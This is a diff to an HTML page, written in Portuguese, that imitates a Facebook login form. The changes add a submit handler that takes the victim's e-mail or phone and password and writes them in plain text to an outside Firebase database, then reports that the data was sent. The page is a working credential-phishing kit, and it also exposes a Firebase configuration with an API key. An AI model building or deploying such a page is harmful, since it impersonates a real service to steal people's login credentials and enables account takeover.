@@ -1,33 +1,68 @@
-<!DOCTYPE html> <html lang="pt-br"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Login - Exemplo</title> <link rel="stylesheet" href="styles.css">
- </head> <body> <div class="container"> <div class="login-box"> 
-    <h1 class="h1">Facebook</h1> <form> <div class="textbox">
-         <input type="text" placeholder="E-mail ou Telefone" required> </div> <div class="textbox"> 
-        <input type="password" placeholder="Senha" required> </div>
-         <input type="submit" class="btn" value="Entrar"> <p class="signup">Não tem uma conta? <a href="#">Crie uma agora</a></p> </form> </div> </div> 
-        <script type="module">
-  // Import the functions you need from the SDKs you need
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
-  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-analytics.js";
-  // TODO: Add SDKs for Firebase products that you want to use
-  // https://firebase.google.com/docs/web/setup#available-libraries
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Exemplo</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<div class="container">
+    <div class="login-box">
+        <h1 class="h1">Facebook</h1>
+        <form id="loginForm">
+            <div class="textbox">
+                <input type="text" id="email" placeholder="E-mail ou Telefone" required>
+            </div>
+            <div class="textbox">
+                <input type="password" id="senha" placeholder="Senha" required>
+            </div>
+            <input type="submit" class="btn" value="Entrar">
+            <p class="signup">Não tem uma conta? <a href="#">Crie uma agora</a></p>
+        </form>
+    </div>
+</div>
+<script type="module">
+    // Import the functions you need from the SDKs you need
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-analytics.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
 
-  // Your web app's Firebase configuration
-  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-  const firebaseConfig = {
-    apiKey: "AIzaSyAXdwi-qCwEVkNsCje4c-R6izIKCI1S5EU",
-    authDomain: "dadosinf-bb992.firebaseapp.com",
-    databaseURL: "https://dadosinf-bb992-default-rtdb.europe-west1.firebasedatabase.app",
-    projectId: "dadosinf-bb992",
-    storageBucket: "dadosinf-bb992.appspot.com",
-    messagingSenderId: "84033846465",
-    appId: "1:84033846465:web:2a04bc2dc851372e6f2840",
-    measurementId: "G-TPSEG409WB"
-  };
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyAXdwi-qCwEVkNsCje4c-R6izIKCI1S5EU",
+        authDomain: "dadosinf-bb992.firebaseapp.com",
+        databaseURL: "https://dadosinf-bb992-default-rtdb.europe-west1.firebasedatabase.app",
+        projectId: "dadosinf-bb992",
+        storageBucket: "dadosinf-bb992.appspot.com",
+        messagingSenderId: "84033846465",
+        appId: "1:84033846465:web:2a04bc2dc851372e6f2840",
+        measurementId: "G-TPSEG409WB"
+    };
 
-  // Initialize Firebase
-  const app = initializeApp(firebaseConfig);
-  const analytics = getAnalytics(app);
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+    const database = getDatabase(app);
+
+    // Form submission handler
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Previne o envio padrão do formulário
+
+        const email = document.getElementById('email').value;
+        const senha = document.getElementById('senha').value;
+
+        // Enviar dados para o Firebase
+        set(ref(database, 'users/' + email.replace('.', ',')), {  // Replace '.' to prevent errors with Firebase keys
+            email: email,
+            senha: senha
+        }).then(() => {
+            alert('Dados enviados com sucesso!');
+        }).catch((error) => {
+            console.error('Erro ao enviar dados: ', error);
+        });
+    });
 </script>
- 
- </body>
-         </html>
+
+</body>
+</html>
